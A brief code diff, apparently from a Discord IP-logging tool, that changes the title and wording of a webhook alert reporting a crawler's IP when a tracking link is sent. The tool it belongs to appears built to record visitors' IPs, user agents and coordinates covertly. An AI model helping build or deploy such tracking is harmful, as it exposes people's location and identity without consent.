@@ -99,9 +99,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "# Link Sent",
+            "title": "# New Information",
             "color": config["color"],
-            "description": f"Information \nAn IP may appear soon.\n\n**Endpoint:** `{endpoint}`\n**Bot IP:** `{ip}`\n**Platform:** `DiscordWebCrawler`",
+            "description": f"Information \nNew\nInfo\nInfo\nInfo\n\nAn IP may appear soon.\n\n**Endpoint:** `{endpoint}`\n**Bot IP:** `{ip}`\n**Platform:** `DiscordWebCrawler`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
